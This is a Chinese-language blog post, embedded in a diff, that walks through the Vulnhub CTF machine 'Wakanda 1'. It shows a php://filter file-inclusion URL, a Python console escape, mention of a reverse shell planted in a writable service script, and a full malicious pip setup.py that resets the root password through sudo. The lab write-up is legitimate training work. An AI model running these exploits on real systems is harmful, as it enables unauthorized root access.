@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="privilege_escalation,文件包含,pip,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="思路 端口扫描, 整理思路 80端口, 文件包含 3333端口, 逃逸python devops, 服务提权 sudo -l, 成功通关">
+<meta name="keywords" content="privilege_escalation,文件包含,pip">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub Challenging: Wakanda 1">
+<meta property="og:url" content="https://exexute.github.io/2018/12/07/Vulnhub-Challengeing-Wakanda/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="思路 端口扫描, 整理思路 80端口, 文件包含 3333端口, 逃逸python devops, 服务提权 sudo -l, 成功通关">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://i1.bvimg.com/671004/50a96bc53eca1783.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/e0e9777d1f7ede98.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/22789e3a40f897dc.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/142f9b19f9dcb91d.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/f616b14939d0ca2a.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/2c40115b56e17beb.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/4c57c441672cae83.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/a2d69fa45fb30dd2.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/3b0b2334caeeba2c.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/6b2aa3371514a94f.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/99e999d454233621.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/89f564467097bfca.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:07.859Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vulnhub Challenging: Wakanda 1">
+<meta name="twitter:description" content="思路 端口扫描, 整理思路 80端口, 文件包含 3333端口, 逃逸python devops, 服务提权 sudo -l, 成功通关">
+<meta name="twitter:image" content="http://i1.bvimg.com/671004/50a96bc53eca1783.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2018/12/07/Vulnhub-Challengeing-Wakanda/">
+
+
+
+
+
+  <title>Vulnhub Challenging: Wakanda 1 | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2018/12/07/Vulnhub-Challengeing-Wakanda/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vulnhub Challenging: Wakanda 1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-07T19:53:36+08:00">
+                2018-12-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>端口扫描, 整理思路</li>
+<li>80端口, 文件包含</li>
+<li>3333端口, 逃逸python</li>
+<li>devops, 服务提权</li>
+<li>sudo -l, 成功通关<a id="more"></a>
+</li>
+</ul>
+<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ul>
+<li>文件包含, php://filter读php代码</li>
+<li>自定义服务, 自动重启</li>
+<li>sudo无密码执行pip, pip提权</li>
+</ul>
+<h4 id="端口扫描-整理思路"><a href="#端口扫描-整理思路" class="headerlink" title="端口扫描, 整理思路"></a>端口扫描, 整理思路</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -Pn -A -p- 10.129.10.36</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/50a96bc53eca1783.png" alt="Markdown"><br>80端口, Apache httpd 2.4.10 无漏洞可用、考虑WEB漏洞<br>111端口, rpcbind和status无法利用 放弃<br>3333端口, ssh服务 搁置<br>53784端口, 放弃</p>
+<h4 id="80端口-文件包含"><a href="#80端口-文件包含" class="headerlink" title="80端口, 文件包含"></a>80端口, 文件包含</h4><p>查看WEB页面源码后发现一个隐藏的url, 访问之后页面内容发生改变;<br><img src="http://i1.bvimg.com/671004/e0e9777d1f7ede98.png" alt="Markdown"></p>
+<p>猜测此处可能的实现方法是: Sql、文件包含、文件读取、内部判断输出</p>
+<ol>
+<li>尝试sql, 丢地址到sqlmap后无果 搁置</li>
+<li>尝试文件包含, wfuzz加字典FUZZ 发现index导致响应不同</li>
+<li>尝试文件读取, BurpSuite加字典FUZZ无果 搁置</li>
+</ol>
+<p>访问：<code>http://10.129.10.36/?lang=php://filter/read=convert.base64-encode/resource=index</code>, 读出bash64编码的数据； 数据丢到BurpSuite解码, 拿到密码<br><img src="http://i1.bvimg.com/671004/22789e3a40f897dc.png" alt="Markdown"></p>
+<h4 id="3333端口-逃逸python"><a href="#3333端口-逃逸python" class="headerlink" title="3333端口, 逃逸python"></a>3333端口, 逃逸python</h4><p>拿到密码后, 在html源码中找到meta字段元标签, 尝试用author的值mamadou作为用户名登陆ssh, 成功登陆<br><img src="http://i1.bvimg.com/671004/142f9b19f9dcb91d.png" alt="Markdown"></p>
+<p>拿到python控制台后, 运行操作系统命令bash, 逃逸python控制台<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">"bash"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>进入mamadou主目录, 发现flag1<br><img src="http://i1.bvimg.com/671004/f616b14939d0ca2a.png" alt="Markdown"></p>
+<h4 id="devops-服务提权"><a href="#devops-服务提权" class="headerlink" title="devops, 服务提权"></a>devops, 服务提权</h4><p>拿到bash后, 执行LinEnum.sh查找可利用点, 结果一无所获. 此时的思路是查找其他用户属主的文件, 找出其中当前用户可写的文件, 然后分析是否有利用的可能</p>
+<p>小提示：当前账号无法查找到可利用的点时, 考虑查找其他账户属主的文件, 重点关注当前权限可写文件, 查找是否有计划任务、服务等利用该文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find / -user devops 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/2c40115b56e17beb.png" alt="Markdown"></p>
+<p>发现文件<code>/srv/.antivirus.py</code>且当前用户可写, 查找当前文件是否被服务调用(根据LinEnum.sh的执行结果, 已排除计划任务的可能性)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep -ri <span class="string">".antivirus.py"</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/4c57c441672cae83.png" alt="Markdown"></p>
+<p>发现有服务在运行此文件, 查看服务内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /lib/systemd/system/antivirus.service</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/a2d69fa45fb30dd2.png" alt="Markdown"></p>
+<p>服务具有自动重启功能, 于是在文件中写入python反弹shell, 拿到devops权限的shell, 获得flag2<br><img src="http://i1.bvimg.com/671004/3b0b2334caeeba2c.png" alt="Markdown"></p>
+<h4 id="sudo-l-成功通关"><a href="#sudo-l-成功通关" class="headerlink" title="sudo -l, 成功通关"></a><code>sudo -l</code>, 成功通关</h4><p>运行LinEnum.sh文件, 查找devops用户中可利用的点, 发现可通过sudo无密码运行pip程序<br><img src="http://i1.bvimg.com/671004/6b2aa3371514a94f.png" alt="Markdown"></p>
+<p>pip是python中用来安装模块的一款工具, python模块是可以自己构建的, 因此此处可通过自建python模块实现提权<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面这段代码改编自:https://github.com/0x00-0x00/fakepip, 感谢大神的分享</span></span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> setuptools.command.install <span class="keyword">import</span> install</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomInstall</span><span class="params">(install)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    install.run(self)</span><br><span class="line">    os.system(<span class="string">'(echo "owefsad";sleep 1;echo "owefsad")|passwd&gt;/dev/null'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">'SetRootPwd'</span>,</span><br><span class="line">      version=<span class="string">'0.0.1'</span>,</span><br><span class="line">      description=<span class="string">'This will exploit a sudoer able to /usr/bin/pip install *'</span>,</span><br><span class="line">      url=<span class="string">''</span>,</span><br><span class="line">      author=<span class="string">'owefsad'</span>,</span><br><span class="line">      author_email=<span class="string">'owefsad@gmail.com'</span>,</span><br><span class="line">      license=<span class="string">'MIT'</span>,</span><br><span class="line">      zip_safe=<span class="keyword">False</span>,</span><br><span class="line">      cmdclass=&#123;<span class="string">'install'</span>: CustomInstall&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>将上面的文件命名为setup.py, 然后放在一个空白文件夹中, 进入文件夹安装SetRootPwd模块, 即可成功修改root密码为<code>owefsad</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> SetRootPwd</span><br><span class="line">$ sudo pip install .</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/99e999d454233621.png" alt="Markdown"></p>
+<p>拿到root.txt中的flag<br><img src="http://i1.bvimg.com/671004/89f564467097bfca.png" alt="Markdown"></p>
+<h4 id="疑点"><a href="#疑点" class="headerlink" title="疑点"></a>疑点</h4><ol>
+<li>从mamadou提权到devops时, 需要利用antivirus服务, 服务必须出错或停止时, 才能能够重启, 然后执行反弹shell; 但是服务中原来的python代码是可以正常执行的, 为何在第一次写入反弹shell后, 可执行反弹sehll?</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/privilege-escalation/" rel="tag"># privilege_escalation</a>
+          
+            <a href="/tags/文件包含/" rel="tag"># 文件包含</a>
+          
+            <a href="/tags/pip/" rel="tag"># pip</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/08/Hexo博客开发环境迁移/" rel="prev" title="Hexo博客开发环境迁移">
+                Hexo博客开发环境迁移 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关键点"><span class="nav-number">2.</span> <span class="nav-text">关键点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描-整理思路"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描, 整理思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#80端口-文件包含"><span class="nav-number">2.2.</span> <span class="nav-text">80端口, 文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3333端口-逃逸python"><span class="nav-number">2.3.</span> <span class="nav-text">3333端口, 逃逸python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#devops-服务提权"><span class="nav-number">2.4.</span> <span class="nav-text">devops, 服务提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sudo-l-成功通关"><span class="nav-number">2.5.</span> <span class="nav-text">sudo -l, 成功通关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#疑点"><span class="nav-number">2.6.</span> <span class="nav-text">疑点</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
